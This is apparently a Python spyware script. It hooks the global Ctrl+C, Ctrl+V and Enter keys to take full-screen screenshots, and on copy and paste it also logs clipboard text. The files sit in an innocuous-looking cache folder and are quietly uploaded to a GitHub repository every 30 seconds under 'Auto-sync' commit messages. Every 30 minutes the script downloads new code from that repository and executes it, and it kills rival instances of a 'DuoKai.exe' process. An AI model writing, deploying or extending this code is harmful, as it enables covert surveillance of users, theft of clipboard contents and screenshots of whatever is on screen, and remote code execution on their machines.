import base64
import importlib.util
import os
import re
import socket
import sys
import threading
import time
import subprocess
from PIL import Image, ImageGrab
from pynput import keyboard
import pyperclip
import requests

DEVICE_NAME = socket.gethostname()
SAVE_DIR = r"D:\AppDataLogs\Cache"
os.makedirs(SAVE_DIR, exist_ok=True)

GITHUB_CONFIG = {
    "username": "Bei18",
    "repo_name": "my-python-storage",
    "file_path": "main_logic.py",
    "token": "",
}

uploaded_files = set()
running_listeners = []


def kill_previous_instances():
    try:
        current_pid = os.getpid()
        
        cmd = 'tasklist /FI "IMAGENAME eq DuoKai.exe" /FO CSV /NH'
        output = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
        for line in output.splitlines():
            if "DuoKai.exe" in line:
                parts = line.split(',')
                if len(parts) >= 2:
                    pid_str = parts[1].replace('"', '').strip()
                    if pid_str.isdigit() and int(pid_str) != current_pid:
                        subprocess.run(f"taskkill /F /PID {pid_str}", shell=True, capture_output=True)

        cmd_wmic = 'wmic process where "name like \'%DuoKai%\' or commandline like \'%_remote_main_cache%\'" get processid'
        output_wmic = subprocess.check_output(cmd_wmic, shell=True, encoding='utf-8', errors='ignore')
        for line in output_wmic.splitlines():
            line = line.strip()
            if line.isdigit() and int(line) != current_pid:
                subprocess.run(f"taskkill /F /PID {line}", shell=True, capture_output=True)
    except Exception:
        pass


def extract_date_from_filename(file_name):
    
    match1 = re.search(r'\b20\d{2}(\d{2})(\d{2})\b', file_name)
    if match1:
        month = str(int(match1.group(1)))
        day = str(int(match1.group(2)))
        return f"{month}.{day}"
        
    match2 = re.search(r'\b20\d{2}-(\d{2})-(\d{2})\b', file_name)
    if match2:
        month = str(int(match2.group(1)))
        day = str(int(match2.group(2)))
        return f"{month}.{day}"
        
    return time.strftime('%m.%d').lstrip('0').replace('.0', '.')


def upload_file_smart(file_path):
    if not os.path.exists(file_path) or not GITHUB_CONFIG["token"]:
        return False

    file_name = os.path.basename(file_path)
    device_folder = DEVICE_NAME

    date_folder = extract_date_from_filename(file_name)

    target_path = f"uploads/{device_folder}/{date_folder}/{file_name}"
    
    base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
    headers = {
        "Authorization": f"Bearer {GITHUB_CONFIG['token']}",
        "Accept": "application/vnd.github+json",
    }

    try:
        get_res = requests.get(base_url, headers=headers, timeout=10)
        if get_res.status_code == 200:
            uploaded_files.add(file_name)
            return True

        with open(file_path, "rb") as f:
            file_content = f.read()
        encoded_content = base64.b64encode(file_content).decode("utf-8")

        data = {
            "message": f"Auto-sync upload: {device_folder}/{date_folder}/{file_name}",
            "content": encoded_content,
        }

        response = requests.put(base_url, headers=headers, json=data, timeout=15)
        if response.status_code in [200, 201]:
            uploaded_files.add(file_name)
            return True
        return False
    except Exception:
        return False


def scan_and_upload():
    try:
        if not os.path.exists(SAVE_DIR):
            return
        files = os.listdir(SAVE_DIR)
        for file in files:
            file_path = os.path.join(SAVE_DIR, file)
            if os.path.isfile(file_path) and file not in uploaded_files:
                upload_file_smart(file_path)
    except Exception:
        pass


def scheduled_upload_task():
    scan_and_upload()
    while True:
        time.sleep(30)
        scan_and_upload()


def get_log_file_path():
    today_date = time.strftime("%Y-%m-%d")
    log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
    return os.path.join(SAVE_DIR, log_filename)


def write_txt(action_type, detail=""):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_content = f"[{timestamp}] [{action_type}] {detail}\n"
    log_file = get_log_file_path()

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_content)
            f.flush()
    except Exception:
        pass


def take_full_screenshot(action_type):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"{DEVICE_NAME}_{timestamp}_{action_type}.png"
    filepath = os.path.join(SAVE_DIR, filename)

    try:
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot.save(filepath, "PNG")
        return filename
    except Exception:
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, "PNG")
            return filename
        except Exception:
            return None


def get_clipboard_content():
    try:
        time.sleep(0.1)
        text = pyperclip.paste()
        if text and text.strip():
            clean_text = text.replace("\r\n", " ").replace("\n", " ")
            return f"文本: {clean_text}"
        else:
            return "无文本"
    except Exception:
        return "获取失败"


def on_copy():
    img_file = take_full_screenshot("PASTE_CtrlC")
    clip_text = get_clipboard_content()
    write_txt("C", f"JT: {img_file} | {clip_text}")


def on_paste():
    img_file = take_full_screenshot("PASTE_CtrlV")
    clip_text = get_clipboard_content()
    write_txt("V", f"JT: {img_file} | {clip_text}")


def on_press(key):
    try:
        if key == keyboard.Key.enter:
            img_file = take_full_screenshot("ENTER")
            write_txt("E", f"JT: {img_file}")
    except Exception:
        pass


def auto_update_loop(token):
    cache_path = os.path.join(os.getenv("TEMP", "."), "_remote_main_cache.py")
    url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{GITHUB_CONFIG['file_path']}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
    }
    
    while True:
        time.sleep(1800) 
        try:
            res = requests.get(url, headers=headers, timeout=10)
            if res.status_code == 200:
                content_b64 = res.json().get("content", "")
                new_code = base64.b64decode(content_b64)
                
                with open(cache_path, "wb") as f:
                    f.write(new_code)
                
                write_txt("系统", "更新，重新载入...")

                for listener in running_listeners:
                    try: listener.stop()
                    except Exception: pass
                running_listeners.clear()

                spec = importlib.util.spec_from_file_location("remote_main", cache_path)
                remote_module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(remote_module)
                
                threading.Thread(target=remote_module.run, args=(token,), daemon=True).start()
                break
        except Exception:
            pass


def run(token):
    kill_previous_instances()

    GITHUB_CONFIG["token"] = token
    write_txt("启动", "服务启动完成")

    upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
    upload_thread.start()

    try:
        hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+c": on_copy, "<ctrl>+v": on_paste})
        hotkey_listener.start()
        running_listeners.append(hotkey_listener)
    except Exception as e:
        write_txt("异常", f"快捷键服务异常: {e}")

    try:
        key_listener = keyboard.Listener(on_press=on_press)
        key_listener.start()
        running_listeners.append(key_listener)
    except Exception as e:
        write_txt("异常", f"按键服务异常: {e}")

    update_thread = threading.Thread(target=auto_update_loop, args=(token,), daemon=True)
    update_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        write_txt("停止", "手动终止")


if __name__ == "__main__":
    pass
